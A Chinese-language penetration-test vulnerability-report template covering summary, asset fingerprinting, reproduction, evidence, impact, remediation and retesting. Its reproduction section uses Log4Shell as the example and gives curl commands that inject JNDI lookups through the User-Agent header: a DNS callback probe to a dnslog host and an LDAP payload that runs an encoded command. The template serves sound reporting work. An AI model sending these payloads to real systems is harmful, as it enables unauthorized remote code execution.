---
title: 漏洞报告模板
cve: 无
severity: info
cvss: 0
product: 方法论
ports: 任意
keywords: report, template, cvss, remediation
verified: false
sources: 公开资料整理（业务逻辑 / 实现 / 配置缺陷类，无 CVE；出处见文末参考）
---

## 标题

`<资产>: <组件> <漏洞名> (<CVE>) 导致 <影响，如 未授权 RCE>`

## 1. 摘要（3 行内）

- 影响：谁能利用、拿到什么（未授权 / 低权 → SYSTEM / 域管）。
- 条件：暴露面 + 版本 + 前置（出网、NLA、debug）。
- 结论：已验证 / 未能验证（写明卡在哪）。

## 2. 资产与指纹

| 项 | 值 |
|---|---|
| 目标 | `https://x.x.x.x:8443` |
| 组件 | `Apache Log4j2 2.14.1`（证据：`jar` 名称 / 报错栈） |
| 暴露面 | 公网 / 内网 / 仅本机 |
| 已有防护 | WAF / 反代 / 无 |

## 3. 复现（最小步骤）

```bash
# 1) 版本证据
curl -sI https://target/ | grep -i '^server'

# 2) 探测（L2）
curl -s https://target/ -H 'User-Agent: ${jndi:dns://xxxx.dnslog.cn}'

# 3) 利用（L3，注明授权）
curl -s https://target/ -H 'User-Agent: ${jndi:ldap://.../Basic/Command/base64/aWQ=}'
```

## 4. 证据

- 请求/响应原文（代码块，别截图）。
- DNS/LDAP 回连记录、命令回显、时间戳。

## 5. 影响分析

- 数据面：可读/可改哪些数据（举例表名、文件路径）。
- 权限面：能到哪一层（主机 / 域 / 云账号）。
- 横向：同一凭据还能打哪些资产（列出）。

## 6. 修复建议

1. 立即：版本升级到 `<fixed version>`（给出 CVE 修复版本）。
2. 缓解（无法立即升级时）：关闭入口、WAF 规则、网络 ACL、临时配置项。
3. 加固：最小权限、日志告警规则（具体事件 ID / 字段）。

## 7. 复测

- 复测命令（与第 3 节同一套）。
- 复测结果：`已修复 / 部分修复 / 未修复`（附响应差异）。

## 8. 附录

- 时间线、参与人、清理记录、参考链接（NVD / 厂商公告 / 分析文章）。
